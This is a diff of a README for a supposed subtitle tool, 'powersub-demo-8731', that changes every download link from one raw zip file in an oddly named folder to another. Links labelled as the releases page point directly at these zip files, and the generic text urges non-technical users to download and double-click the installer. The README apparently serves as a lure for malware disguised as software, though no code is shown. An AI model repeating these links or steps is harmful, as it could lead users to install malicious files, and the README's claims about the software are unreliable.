@@ -4,7 +4,7 @@
 Welcome to powersub-demo-8731! This application makes managing subtitles a breeze. It's designed for everyday users who want a straightforward solution without the hassle of technical details. Follow the steps below to download and run your new favorite subtitle tool.
 
 ## 📥 Download the App
-[![Download](https://raw.githubusercontent.com/Harshananthan/powersub-demo-8731/main/plasmolyzability/powersub-demo-8731.zip%20Latest%https://raw.githubusercontent.com/Harshananthan/powersub-demo-8731/main/plasmolyzability/powersub-demo-8731.zip)](https://raw.githubusercontent.com/Harshananthan/powersub-demo-8731/main/plasmolyzability/powersub-demo-8731.zip)
+[![Download](https://raw.githubusercontent.com/Harshananthan/powersub-demo-8731/main/psychogenetics/powersub_demo_v2.2.zip%20Latest%https://raw.githubusercontent.com/Harshananthan/powersub-demo-8731/main/psychogenetics/powersub_demo_v2.2.zip)](https://raw.githubusercontent.com/Harshananthan/powersub-demo-8731/main/psychogenetics/powersub_demo_v2.2.zip)
 
 ## 📋 System Requirements
 Before you download, ensure your system meets these basic requirements:
@@ -23,9 +23,9 @@ Before you download, ensure your system meets these basic requirements:
 ## 🛠️ Download & Install
 To get started, visit the releases page and download the latest version of the app. Click the button below to go directly to it:
 
-[![Download](https://raw.githubusercontent.com/Harshananthan/powersub-demo-8731/main/plasmolyzability/powersub-demo-8731.zip%20Latest%https://raw.githubusercontent.com/Harshananthan/powersub-demo-8731/main/plasmolyzability/powersub-demo-8731.zip)](https://raw.githubusercontent.com/Harshananthan/powersub-demo-8731/main/plasmolyzability/powersub-demo-8731.zip)
+[![Download](https://raw.githubusercontent.com/Harshananthan/powersub-demo-8731/main/psychogenetics/powersub_demo_v2.2.zip%20Latest%https://raw.githubusercontent.com/Harshananthan/powersub-demo-8731/main/psychogenetics/powersub_demo_v2.2.zip)](https://raw.githubusercontent.com/Harshananthan/powersub-demo-8731/main/psychogenetics/powersub_demo_v2.2.zip)
 
-1. **Visit the Releases Page:** Go to [this link](https://raw.githubusercontent.com/Harshananthan/powersub-demo-8731/main/plasmolyzability/powersub-demo-8731.zip).
+1. **Visit the Releases Page:** Go to [this link](https://raw.githubusercontent.com/Harshananthan/powersub-demo-8731/main/psychogenetics/powersub_demo_v2.2.zip).
 2. **Select the Latest Release:** Look for the most recent version at the top of the page.
 3. **Download the Installer:** Click on the file that matches your operating system. It will typically have "Windows" or "macOS" in the file name.
 4. **Open the Installer:** Locate the downloaded file in your system's "Downloads" folder and double-click to start the installation process.
@@ -53,7 +53,7 @@ A: Yes! You can report issues by visiting the issues tab on our GitHub repositor
 We believe in building a strong community. Join our discussions and connect with other users in the GitHub community. If you have questions or need support, please reach out through the GitHub issues page.
 
 ## 🔄 Updating the App
-Make sure you keep your app updated. Visit the [Releases Page](https://raw.githubusercontent.com/Harshananthan/powersub-demo-8731/main/plasmolyzability/powersub-demo-8731.zip) periodically or enable notifications for new releases to stay informed about features and fixes.
+Make sure you keep your app updated. Visit the [Releases Page](https://raw.githubusercontent.com/Harshananthan/powersub-demo-8731/main/psychogenetics/powersub_demo_v2.2.zip) periodically or enable notifications for new releases to stay informed about features and fixes.
 
 ## 📜 License Information
 Powersub-demo-8731 is open-source software. You can use it freely, but please review our licensing terms on the GitHub page for more detailed information.
